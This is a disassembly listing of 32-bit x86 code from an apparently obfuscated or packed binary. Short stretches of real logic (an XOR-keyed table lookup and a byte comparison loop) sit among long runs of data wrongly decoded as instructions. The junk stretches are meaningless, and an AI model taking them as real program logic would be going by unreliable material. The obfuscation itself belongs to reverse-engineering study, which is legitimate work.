  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	pushf  
  4049bc:	sub    BYTE PTR [edx],dh
  4049be:	sbb    ecx,ecx
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0xd870707d
  4049c8:	xor    al,BYTE PTR [ebx-0x71825f0a]
  4049ce:	sbb    ecx,DWORD PTR [eax+0x675f3cbe]
  4049d4:	cmp    cl,BYTE PTR [edi+0x1123ca06]
  4049da:	mov    dx,WORD PTR [esi-0x7c4a1c7e]
  4049e1:	(bad)  
  4049e3:	cli    
  4049e4:	arpl   WORD PTR [edx],sp
  4049e6:	add    al,0xb0
  4049e8:	les    ebx,FWORD PTR [eax]
  4049ea:	jbe    0x404a03
  4049ec:	and    eax,0x5bf3f6d7
  4049f1:	mov    bh,0x26
  4049f3:	ins    DWORD PTR es:[edi],dx
  4049f4:	shl    BYTE PTR [esi],cl
  4049f6:	and    DWORD PTR [eax+0x5],ebp
  4049f9:	es dec eax
  4049fb:	mov    ebp,0x4c6ac946
  404a00:	xchg   ebx,eax
  404a01:	cmc    
  404a02:	sub    BYTE PTR [eax+0x4753bdde],al
  404a08:	int    0xf5
  404a0a:	jge    0x404a1c
  404a0c:	mov    ch,0xb8
  404a0e:	adc    BYTE PTR [edi+0x6c],dl
  404a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a12:	popa   
  404a13:	ins    BYTE PTR es:[edi],dx
  404a14:	into   
  404a15:	ja     0x404a3d
  404a17:	int    0x6e
  404a19:	and    al,0xaf
  404a1b:	les    edx,FWORD PTR [esi]
  404a1d:	into   
  404a1e:	inc    esp
  404a1f:	sub    eax,0x756df5e5
  404a24:	adc    eax,eax
  404a26:	rcr    DWORD PTR [ecx-0x57],1
  404a29:	adc    eax,0xbc1cc509
  404a2e:	add    edi,edi
  404a30:	adc    al,0xdf
  404a32:	fs add eax,0xc958ec05
  404a38:	xlat   BYTE PTR ds:[ebx]
  404a39:	jbe    0x404a8f
  404a3b:	cmp    eax,0x84736a94
  404a40:	hlt    
  404a41:	and    bh,bl
  404a43:	mul    bl
  404a45:	push   eax
  404a46:	rcr    BYTE PTR [ebx-0x266a2f3f],1
  404a4c:	jmp    0xa84:0xaca2d529
  404a53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a54:	adc    DWORD PTR [ebx],esi
  404a56:	addr16 adc cl,dl
  404a59:	arpl   WORD PTR [edi+0x2a48da67],si
  404a5f:	je     0x404a0d
  404a61:	in     eax,dx
  404a62:	mov    cl,0x36
  404a64:	inc    ecx
  404a65:	dec    ebp
  404a66:	clflush BYTE PTR [esi]
  404a69:	sbb    eax,0x4d20e45f
  404a6e:	shl    DWORD PTR [ebx],cl
  404a70:	xchg   edx,eax
  404a71:	fwait
  404a72:	and    eax,DWORD PTR [ebx]
  404a74:	js     0x404a01
  404a76:	and    dl,BYTE PTR [ecx]
  404a78:	jno    0x404af2
  404a7a:	jb     0x404a67
  404a7c:	stos   BYTE PTR es:[edi],al
  404a7d:	mov    al,ds:0xb54510c5
  404a82:	loopne 0x404a33
  404a84:	(bad)  
  404a85:	and    ecx,DWORD PTR [edi+0x7f]
  404a88:	pop    ecx
  404a89:	mov    edi,0xe4c487ba
  404a8e:	inc    eax
  404a8f:	push   eax
  404a90:	repnz mov eax,ds:0x236a1c61
  404a96:	and    al,0xea
  404a98:	ins    DWORD PTR es:[edi],dx
  404a99:	xor    dh,ah
  404a9b:	xor    dl,BYTE PTR [ebx+eiz*8]
  404a9e:	call   0x55d09e32
  404aa3:	mov    al,ds:0x863ede1a
  404aa8:	in     al,0xc8
  404aaa:	hlt    
  404aab:	or     eax,0xe3dab86e
  404ab0:	cmovae ebp,DWORD PTR [edi+edi*2-0x5e45285]
  404ab8:	push   DWORD PTR [ecx]
  404aba:	cli    
  404abb:	push   esp
  404abc:	scas   al,BYTE PTR es:[edi]
  404abd:	popa   
  404abe:	push   ss
  404abf:	stos   BYTE PTR es:[edi],al
  404ac0:	mov    DWORD PTR [ebx],ebx
  404ac2:	adc    DWORD PTR [edx],edx
  404ac4:	aam    0x92
  404ac6:	data16 stos BYTE PTR es:[edi],al
  404ac8:	shl    BYTE PTR [edx],cl
  404aca:	mov    ds:0xfee4849b,al
  404acf:	mov    edx,0x100d9b1f
  404ad4:	je     0x404a5b
  404ad6:	cmp    esp,ebx
  404ad8:	add    BYTE PTR [ebp-0x7d],bh
  404adb:	adc    al,0x83
  404add:	push   edi
  404ade:	in     eax,0x14
  404ae0:	aas    
  404ae1:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404ae3:	fdivr  st,st(0)
  404ae5:	pushf  
  404ae6:	inc    eax
  404ae7:	mov    edx,0x6194bf89
  404aec:	daa    
  404aed:	clc    
  404aee:	push   esp
  404aef:	push   ds
  404af0:	jno    0x404a80
  404af2:	fiadd  DWORD PTR [edi-0x2b]
  404af6:	dec    esi
  404af7:	jae    0x404ad3
  404af9:	sub    ecx,DWORD PTR [edi]
  404afb:	cmp    BYTE PTR [ebx],ch
  404afd:	test   BYTE PTR [eax+0x47],dh
  404b00:	inc    ebx
  404b01:	xlat   BYTE PTR ds:[ebx]
  404b02:	mov    edx,0x107181f5
  404b07:	in     eax,0xd3
  404b09:	jecxz  0x404b26
  404b0b:	pop    ss
  404b0c:	fcmovnu st,st(5)
  404b0e:	mov    ecx,0x1def408c
  404b13:	push   eax
  404b14:	and    dl,BYTE PTR [eax]
  404b16:	or     edx,DWORD PTR [ebp+0x3ddeefa1]
  404b1c:	bound  ecx,QWORD PTR ds:0x2a18d741
  404b22:	xchg   DWORD PTR [ecx],eax
  404b24:	retf   0x3401
  404b27:	clc    
  404b28:	inc    ecx
  404b29:	out    dx,al
  404b2a:	sbb    DWORD PTR [edi-0x7a382c70],edx
  404b30:	int    0x8
  404b32:	cmp    DWORD PTR [edi+0x3f],edi
  404b35:	nop
  404b36:	dec    esp
  404b37:	sub    DWORD PTR [ebx],eax
  404b39:	lea    edi,[edx+0x1bdb5b5e]
  404b3f:	scas   eax,DWORD PTR es:[edi]
  404b40:	mov    WORD PTR [esi-0x31ac430f],fs
  404b46:	mov    ds:0xe428f612,eax
  404b4b:	fimul  WORD PTR [esi+0x5a5e5ddb]
  404b51:	(bad)  
  404b52:	repnz dec ebx
  404b54:	push   0xb017823a
  404b59:	or     DWORD PTR [ecx+0x7c],0x22
  404b5d:	loop   0x404b6a
  404b5f:	and    al,0xb0
  404b61:	dec    esp
  404b62:	mov    eax,ds:0x371447a2
  404b67:	ss inc edx
  404b69:	loopne 0x404bb4
  404b6b:	out    dx,al
  404b6c:	inc    ebp
  404b6d:	jbe    0x404bbc
  404b6f:	dec    ebp
  404b70:	gs pop ecx
  404b72:	retf   
  404b73:	pop    esi
  404b74:	push   eax
  404b75:	adc    DWORD PTR [esi],ebx
  404b77:	(bad)  
  404b78:	div    esi
  404b7a:	lock pop edx
  404b7c:	pusha  
  404b7d:	int    0xf7
  404b7f:	cmc    
  404b80:	call   0xac0420c2
  404b85:	(bad)  
  404b86:	sub    ecx,eax
  404b88:	adc    DWORD PTR [eax-0x52],esi
  404b8b:	jl     0x404b4e
  404b8d:	repnz dec ecx
  404b8f:	inc    esp
  404b90:	das    
  404b91:	imul   esp,DWORD PTR [ebp+0x551bc4ce],0x4d3d9ce2
  404b9b:	outs   dx,BYTE PTR ds:[esi]
  404b9c:	pop    DWORD PTR [esi-0x6efcde9]
  404ba2:	pop    ebp
  404ba3:	sar    ah,1
  404ba5:	push   ecx
  404ba6:	push   esi
  404ba7:	sbb    DWORD PTR [ecx+0x6e],ecx
  404baa:	ret    0x5158
  404bad:	arpl   WORD PTR [ebx+0x4d69fff],ax
  404bb3:	lock jno 0x404bde
  404bb6:	xchg   DWORD PTR [esp+ebp*1],ebp
  404bb9:	lea    esi,[esi-0x33]
  404bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bbd:	cmp    eax,0x7540a9f9
  404bc2:	sahf   
  404bc3:	ror    DWORD PTR ds:0xbddff33d,cl
  404bc9:	fld    QWORD PTR [ebp+0x7a]
  404bcc:	jae    0x404b96
  404bce:	push   edx
  404bcf:	stos   BYTE PTR es:[edi],al
  404bd0:	cmp    ecx,DWORD PTR [esi-0x1291ba07]
  404bd6:	inc    edi
  404bd7:	cmc    
  404bd8:	sbb    bl,bh
  404bda:	gs retf 0x60ae
  404bde:	add    DWORD PTR [edx-0x2c90e1d],esi
  404be4:	in     eax,dx
  404be5:	lahf   
  404be6:	inc    edi
  404be7:	adc    DWORD PTR [eax-0x1d0a710d],eax
  404bed:	cld    
  404bee:	inc    esp
  404bef:	adc    al,0xe9
  404bf1:	pop    esp
  404bf2:	icebp  
  404bf3:	and    eax,0x24a54d3d
  404bf8:	repnz out 0xfe,al
  404bfb:	cmp    DWORD PTR [ebx+0x5d],edi
  404bfe:	cmp    eax,0x964aa884
  404c03:	shl    BYTE PTR [ebx+0x64],1
  404c06:	inc    eax
  404c07:	dec    ecx
  404c08:	iret   
  404c09:	pop    ebx
  404c0a:	(bad)  
  404c0b:	cli    
  404c0c:	adc    dh,BYTE PTR cs:[ebx]
  404c0f:	pop    esp
  404c10:	and    al,0xe
  404c12:	push   esi
  404c13:	cmp    eax,0xb4c35d8a
  404c18:	(bad)  
  404c1a:	push   ebx
  404c1b:	xchg   BYTE PTR [esi+0x26],al
  404c1e:	dec    eax
  404c1f:	shl    BYTE PTR [ecx-0x31af749a],cl
  404c25:	retf   
  404c26:	js     0x404bb7
  404c28:	mov    eax,0x707ea3c
  404c2d:	xchg   esp,eax
  404c2e:	les    eax,FWORD PTR ds:0xcda84bcf
  404c34:	jg     0x404c78
  404c36:	loopne 0x404c88
  404c38:	je     0x404c40
  404c3a:	ja     0x404be6
  404c3c:	mov    cl,bl
  404c3e:	outs   dx,DWORD PTR ds:[esi]
  404c3f:	mov    ah,0xab
  404c41:	cmp    eax,0x51c9ea08
  404c46:	jge    0x404c38
  404c48:	dec    ecx
  404c49:	or     eax,0x5bf1cbef
  404c4e:	mov    esp,eax
  404c50:	loopne 0x404bea
  404c52:	xor    DWORD PTR [edx-0x80],ecx
  404c55:	loope  0x404c65
  404c57:	or     edx,DWORD PTR [ecx+edx*4+0x484ca0d4]
  404c5e:	gs pushf 
  404c60:	mov    ebp,DWORD PTR [edx-0x75671a]
  404c66:	in     eax,dx
  404c67:	retf   
  404c68:	div    BYTE PTR [esi-0x1c936ca]
  404c6e:	cmp    al,0xf7
  404c70:	inc    eax
  404c71:	mov    eax,0x5a571e2
  404c76:	lds    ebp,FWORD PTR [ebx+eax*1-0x3a560313]
  404c7d:	adc    cl,BYTE PTR [esi]
  404c7f:	dec    eax
  404c80:	sub    BYTE PTR [eax+0x405a0f3b],dl
  404c86:	push   ecx
  404c87:	push   eax
  404c88:	test   ecx,ebx
  404c8a:	add    ecx,DWORD PTR [esi+0x4d9d8df2]
  404c90:	mov    eax,ds:0xfff3e03a
  404c95:	shl    edi,1
  404c97:	jge    0x404c5e
  404c99:	adc    edx,DWORD PTR [edx+0x5c]
  404c9c:	div    BYTE PTR [ebp-0x79]
  404c9f:	js     0x404c76
  404ca1:	test   BYTE PTR [esi],al
  404ca3:	jno    0x404cef
  404ca5:	cmp    DWORD PTR [edx+0x3f3d017],ebp
  404cab:	int3   
  404cac:	fsub   DWORD PTR [esi-0x78]
  404caf:	out    0x66,eax
  404cb1:	mov    edx,0xed7a8868
  404cb6:	dec    ebp
  404cb7:	out    dx,eax
  404cb8:	dec    esp
  404cb9:	sbb    eax,0xb1de738
  404cbe:	mov    ecx,0xeac38a9b
  404cc3:	mov    cl,0xda
  404cc5:	shr    BYTE PTR cs:[eax-0x12],cl
  404cc9:	mov    esp,0x77a62610
  404cce:	pop    esp
  404cd0:	fadd   QWORD PTR ds:0xcbbfa3e7
  404cd6:	seta   BYTE PTR [eax+ebp*8]
  404cda:	adc    ebp,DWORD PTR [edx+0xd]
  404cdd:	repnz adc dl,cl
  404ce0:	pop    ebp
  404ce1:	(bad)  
  404ce2:	repnz shl esp,1
  404ce5:	stos   DWORD PTR es:[edi],eax
  404ce6:	mov    BYTE PTR [esi-0x1012135a],cl
  404cec:	loop   0x404d0b
  404cee:	xchg   edi,eax
  404cef:	mov    ds:0x187afb15,al
  404cf4:	jmp    0x632c6c1
  404cf9:	in     eax,dx
  404cfa:	mov    ah,0x84
  404cfc:	cmp    eax,0xea2b43b9
  404d01:	add    esi,ecx
  404d03:	xchg   edi,eax
  404d04:	and    al,0x8a
  404d06:	sub    BYTE PTR [edi+0x48],dl
  404d09:	fadd   QWORD PTR [ebx]
  404d0b:	mov    edi,0x42e6ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x45]
  404d39:	popf   
  404d3a:	mov    ds:0x702e96a9,al
  404d3f:	jo     0x404d7e
  404d41:	jge    0x404db3
  404d43:	jo     0x404d30
  404d45:	push   ebp
  404d46:	jne    0x404d41
  404d48:	lahf   
  404d49:	xchg   edx,eax
  404d4a:	rcl    dl,cl
  404d4c:	jmp    0xec437b76
  404d51:	cmp    bl,BYTE PTR [ebp+0xa]
  404d54:	push   ebp
  404d55:	xchg   ebp,eax
  404d56:	ret    0x1e34
  404d59:	inc    ebp
  404d5a:	out    dx,al
  404d5b:	sti    
  404d5c:	loope  0x404d78
  404d5e:	push   edi
  404d5f:	jmp    0x404d9a
  404d61:	mov    al,ds:0xf4ca86e6
  404d66:	call   0xb84c:0x41198ea9
  404d6d:	pop    edi
  404d6e:	adc    esp,DWORD PTR [ebx+eax*2]
  404d71:	mov    WORD PTR [edx+0x11efb0a1],ds
  404d77:	sub    DWORD PTR [ebx+0x7b65ff11],eax
  404d7d:	pop    ebp
  404d7e:	inc    esi
  404d7f:	fcom   DWORD PTR [edx-0x7d]
  404d82:	ds icebp 
  404d84:	push   edi
  404d85:	stos   DWORD PTR es:[edi],eax
  404d86:	outs   dx,DWORD PTR ds:[esi]
  404d87:	xlat   BYTE PTR ds:[ebx]
  404d88:	pushf  
  404d89:	clc    
  404d8a:	inc    esp
  404d8b:	sahf   
  404d8c:	loopne 0x404dca
  404d8e:	pushf  
  404d8f:	nop
  404d90:	dec    eax
  404d91:	sbb    BYTE PTR [ebx-0xa84b581],ah
  404d97:	dec    ebx
  404d98:	dec    edi
  404d99:	and    DWORD PTR [edi+0x3d],ecx
  404d9c:	push   ss
  404d9d:	(bad)  
  404d9e:	nop
  404d9f:	pop    es
  404da0:	push   ebx
  404da1:	add    DWORD PTR [edx-0x1a],esp
  404da4:	mov    ds:0xabe5af90,al
  404da9:	pop    ebx
  404daa:	push   esp
  404dab:	enter  0x5e13,0xe5
  404daf:	popa   
  404db0:	dec    esp
  404db1:	inc    esi
  404db2:	lods   al,BYTE PTR ds:[esi]
  404db3:	aam    0x12
  404db5:	jo     0x404df6
  404db7:	inc    esp
  404db8:	pushf  
  404db9:	loope  0x404db3
  404dbb:	sti    
  404dbc:	mov    ah,al
  404dbe:	or     ah,BYTE PTR [ecx+0x4b26593a]
  404dc4:	repz pop esp
  404dc6:	jb     0x404da3
  404dc8:	push   DWORD PTR [esi+0x18b83dc7]
  404dce:	adc    DWORD PTR [edx+0x1e],edx
  404dd1:	fmul   st(5),st
  404dd3:	pop    edx
  404dd4:	fs jae 0x404e44
  404dd7:	and    eax,0x93e39b9d
  404ddc:	hlt    
  404ddd:	push   0xcc7d8878
  404de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de3:	pop    ecx
  404de4:	lods   al,BYTE PTR ds:[esi]
  404de5:	jl     0x404e06
  404de7:	in     eax,dx
  404de8:	jle    0x404e19
  404dea:	mov    al,0xbb
  404dec:	(bad)  
  404ded:	(bad)  
  404dee:	jnp    0x404e60
  404df0:	and    ebp,edx
  404df2:	jne    0x404e6a
  404df4:	pushf  
  404df5:	adc    ebp,DWORD PTR [ebp-0x633c22e6]
  404dfb:	adc    eax,0x12be24da
  404e00:	xchg   esp,eax
  404e01:	xor    esi,esp
  404e03:	add    ah,ah
  404e05:	pop    esp
  404e06:	pusha  
  404e07:	imul   esp,esi,0xffffffa2
  404e0a:	ins    BYTE PTR es:[edi],dx
  404e0b:	sti    
  404e0c:	inc    esi
  404e0d:	inc    ebx
  404e0e:	inc    esi
  404e0f:	in     eax,dx
  404e10:	dec    ecx
  404e11:	xchg   esi,eax
  404e12:	push   es
  404e13:	and    BYTE PTR [edi+0x4c],dh
  404e16:	add    DWORD PTR [ebx-0x47d30f61],0x9ecfcd44
  404e20:	jbe    0x404daa
  404e22:	pop    ss
  404e23:	test   eax,0xa63b3e2e
  404e28:	mov    bl,0x91
  404e2a:	popf   
  404e2b:	(bad)  
  404e2c:	bound  edx,QWORD PTR [esi]
  404e2e:	add    BYTE PTR [edi],ch
  404e30:	push   ebp
  404e31:	xchg   edx,ecx
  404e33:	call   0x56e2:0xef1d2ace
  404e3a:	and    BYTE PTR [edx-0x281040dc],0x39
  404e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e42:	sub    ecx,DWORD PTR [ecx-0x20822a7e]
  404e48:	ds mov dl,ah
  404e4b:	bound  ecx,QWORD PTR [eax+0x5a5c929f]
  404e51:	fstp   st(1)
  404e53:	pushf  
  404e54:	dec    ebp
  404e55:	xor    eax,0x43aceb3a
  404e5a:	bound  ebx,QWORD PTR [eax-0x50]
  404e5d:	and    al,0xf1
  404e5f:	pop    edx
  404e60:	fistp  QWORD PTR [edx]
  404e62:	sbb    ebx,DWORD PTR [esi-0xb]
  404e65:	inc    eax
  404e66:	stos   DWORD PTR es:[edi],eax
  404e67:	sbb    al,0xb5
  404e69:	outs   dx,BYTE PTR ds:[esi]
  404e6a:	clc    
  404e6b:	jle    0x404e3d
  404e6d:	shl    dl,cl
  404e6f:	(bad)  
  404e70:	jae    0x404e9f
  404e72:	dec    esi
  404e73:	into   
  404e74:	mov    cl,0x99
  404e76:	or     DWORD PTR [eax-0x4f743c15],edx
  404e7c:	lock jmp 0x6ac347a5
  404e82:	rol    BYTE PTR [ecx],cl
  404e84:	fidiv  WORD PTR [ecx+0x16c7dbd0]
  404e8a:	push   ss
  404e8b:	jg     0x404e73
  404e8d:	bound  ebp,QWORD PTR [di-0x6e]
  404e91:	int    0x4b
  404e93:	xchg   ebx,eax
  404e94:	scas   al,BYTE PTR es:[edi]
  404e95:	shr    DWORD PTR [ecx-0x35],1
  404e98:	pop    ebp
  404e99:	and    dh,bl
  404e9b:	xor    bl,0x76
  404e9e:	mov    ds:0x36d1c06e,al
  404ea3:	sar    DWORD PTR [ecx-0x5370ef85],0xd6
  404eaa:	popa   
  404eab:	xor    ebp,eax
  404ead:	mov    eax,edi
  404eaf:	push   edi
  404eb0:	es mov ah,0x39
  404eb3:	inc    ebp
  404eb4:	xchg   ecx,eax
  404eb5:	push   es
  404eb6:	push   ds
  404eb7:	je     0x404f12
  404eb9:	cli    
  404eba:	cmp    DWORD PTR [edi-0x9],eax
  404ebd:	mov    cl,0xf2
  404ebf:	mov    ch,BYTE PTR [eax+edi*1]
  404ec2:	(bad)  
  404ec3:	retf   0x2d91
  404ec6:	lock dec esi
  404ec8:	sbb    eax,0xf6ca12d9
  404ecd:	(bad)  
  404ece:	mov    esi,0xe6788487
  404ed3:	std    
  404ed4:	fdivrp st(5),st
  404ed6:	ins    DWORD PTR es:[edi],dx
  404ed7:	xor    edx,edi
  404ed9:	sub    eax,0x23ef2f82
  404ede:	cmp    cl,bl
  404ee0:	add    BYTE PTR [edx-0x3ea1b1c9],dl
  404ee6:	cmp    BYTE PTR [eax+edi*2-0x7b],al
  404eea:	xchg   esp,eax
  404eeb:	mov    ebp,0x240e994
  404ef0:	je     0x404e95
  404ef2:	stos   BYTE PTR es:[edi],al
  404ef3:	push   eax
  404ef4:	xor    BYTE PTR [eax-0x55144f9c],ah
  404efa:	xor    DWORD PTR [eax+0x6e2b09d2],esp
  404f00:	adc    BYTE PTR [ecx-0x6dacfe6d],dh
  404f06:	and    al,0x4a
  404f08:	xchg   edi,eax
  404f09:	ret    0xeb12
  404f0c:	jle    0x404ef8
  404f0e:	fcomp  DWORD PTR ds:0x606e1fe9
  404f14:	sub    al,0xd4
  404f16:	fwait
  404f17:	aaa    
  404f18:	icebp  
  404f19:	daa    
  404f1a:	addr16 xchg esp,eax
  404f1c:	lods   al,BYTE PTR ds:[esi]
  404f1d:	fcmovnbe st,st(7)
  404f1f:	inc    edi
  404f20:	mov    ?,WORD PTR [ecx+0x3e]
  404f23:	outs   dx,BYTE PTR ds:[esi]
  404f24:	pop    ecx
  404f25:	xchg   edx,eax
  404f26:	rcr    dh,cl
  404f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f29:	int    0xf1
  404f2b:	inc    esp
  404f2c:	fs mov ah,0x1d
  404f2f:	adc    esp,ebp
  404f31:	xchg   edi,eax
  404f32:	adc    ebp,DWORD PTR [esi+ebx*4-0xa]
  404f36:	push   ecx
  404f37:	in     al,dx
  404f38:	out    dx,al
  404f39:	sbb    BYTE PTR [ebx+0x31269003],cl
  404f3f:	lods   al,BYTE PTR ds:[esi]
  404f40:	inc    edi
  404f41:	mov    al,ds:0x508aa75b
  404f46:	jle    0x404edc
  404f48:	inc    ebx
  404f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f4a:	pop    ebp
  404f4b:	pop    edx
  404f4c:	or     ah,ch
  404f4e:	addr16 pop esp
  404f50:	push   edi
  404f51:	lea    ecx,[esi]
  404f53:	test   BYTE PTR [ecx+ebp*4-0x1f],dh
  404f57:	jno    0x404f69
  404f59:	jl     0x404f5c
  404f5b:	pop    ecx
  404f5c:	in     eax,0x85
  404f5e:	mov    ds:0x2a5d94b4,al
  404f63:	(bad)
  404f67:	push   esp
  404f68:	adc    BYTE PTR [esi],bh
  404f6a:	pop    ebp
  404f6b:	sti    
  404f6c:	loopne 0x404f42
  404f6e:	sbb    eax,0x8909f17f
  404f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f74:	test   eax,0x66846914
  404f79:	sar    BYTE PTR [edi+0x3ece5d65],0x4c
  404f80:	dec    sp
  404f82:	(bad)  
  404f83:	xlat   BYTE PTR ds:[ebx]
  404f84:	mov    esp,0xa0db2e0c
  404f89:	in     al,dx
  404f8a:	clc    
  404f8b:	bsr    edi,DWORD PTR [ecx+0x496e7973]
  404f92:	inc    esp
  404f93:	pop    esp
  404f94:	(bad)  
  404f95:	and    eax,0xc31a45d3
  404f9a:	shr    BYTE PTR [esi+0x29198c61],1
  404fa0:	in     eax,dx
  404fa1:	adc    eax,0x7da8d1b0
  404fa6:	mov    ebp,0xd92d55b8
  404fab:	call   0x3372:0xdc1ac008
  404fb2:	aad    0xdb
  404fb4:	loope  0x404f62
  404fb6:	pop    eax
  404fb7:	(bad)  
  404fb8:	mov    ch,0x95
  404fba:	add    BYTE PTR ds:0xb57592fa,al
  404fc0:	fdivrp st(2),st
  404fc2:	mov    ah,0x15
  404fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fc5:	test   DWORD PTR [eax],esi
  404fc7:	shr    cl,0x1d
  404fca:	mov    WORD PTR [ebx+0x3d89fbc6],es
  404fd0:	ffreep st(2)
  404fd2:	mov    cl,0x7f
  404fd4:	push   edx
  404fd5:	clc    
  404fd6:	ins    DWORD PTR es:[edi],dx
  404fd7:	dec    esp
  404fd9:	jg     0x404fa4
  404fdb:	pop    edx
  404fdc:	xchg   edi,eax
  404fdd:	or     ebp,DWORD PTR [ecx-0x70]
  404fe0:	dec    ebp
  404fe1:	xchg   BYTE PTR [eax-0x1e],dh
  404fe4:	inc    esi
  404fe5:	mov    dh,BYTE PTR [eax+0x39f1ef1]
  404feb:	test   BYTE PTR [esi],bh
  404fed:	stos   BYTE PTR es:[edi],al
  404fee:	out    dx,al
  404fef:	test   al,0xc6
  404ff1:	xlat   BYTE PTR ds:[ebx]
  404ff2:	loop   0x405036
  404ff4:	push   edi
  404ff5:	xchg   esp,eax
  404ff6:	aam    0x1d
  404ff8:	push   edx
  404ff9:	fsubr  st,st(3)
  404ffb:	js     0x405047
  404ffd:	xor    eax,0x9ca83197
  405002:	pop    eax
  405003:	(bad)  
  405004:	cmp    ebx,DWORD PTR [esi]
  405006:	cwde   
  405007:	push   ebp
  405008:	inc    esi
  405009:	and    DWORD PTR [esi],ebp
  40500b:	fs jbe 0x405012
  40500e:	test   DWORD PTR [ebx],ebp
  405010:	(bad)
  405013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405014:	test   eax,0x89da4c51
  405019:	loopne 0x405011
  40501b:	clc    
  40501c:	add    al,0xd1
  40501e:	pusha  
  40501f:	aaa    
  405020:	push   0xffffffa6
  405022:	call   0x8a001d6b
  405027:	jae    0x404fe3
  405029:	jb     0x404faf
  40502b:	icebp  
  40502c:	xor    bl,BYTE PTR [edx]
  40502e:	xchg   BYTE PTR [eax+0x72631bc6],bh
  405034:	or     eax,0xfe6b4679
  405039:	iret   
  40503a:	das    
  40503b:	outs   dx,BYTE PTR ds:[esi]
  40503c:	adc    al,0x95
  40503e:	scas   eax,DWORD PTR es:[edi]
  40503f:	mov    esi,0x41096603
  405044:	or     ebx,DWORD PTR [edi]
  405046:	add    dh,BYTE PTR [eax+eax*4-0x6b]
  40504a:	(bad)  
  40504c:	lds    edx,FWORD PTR [esi-0x40886b22]
  405052:	mov    esi,0x6a70c616
  405057:	push   ebp
  405058:	add    al,BYTE PTR ds:0x590fa358
  40505e:	adc    al,0x39
  405060:	sub    esp,DWORD PTR [ebp+0x26]
  405063:	in     al,0x2c
  405065:	lea    ebp,[edi+0x1f]
  405068:	les    edi,FWORD PTR [ebx-0x55]
  40506b:	cwde   
  40506c:	xor    al,0x30
  40506e:	out    0xf2,al
  405070:	xor    al,0xe0
  405072:	mov    ch,0x1c
  405074:	leave  
  405075:	sbb    ch,ch
  405077:	dec    eax
  405078:	push   0xd5fbfd97
  40507d:	stos   BYTE PTR es:[edi],al
  40507e:	jns    0x405026
  405080:	test   DWORD PTR ds:0x9e62a435,edi
  405086:	ret    
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
